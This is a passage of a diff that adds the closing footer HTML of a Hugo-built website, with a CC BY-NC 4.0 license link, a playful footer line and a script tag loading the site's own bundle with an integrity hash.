+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>framework: <a href="http://gohugo.io">Hugo</a></span><span>in rami malek we trust</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+    </body>
+</html>
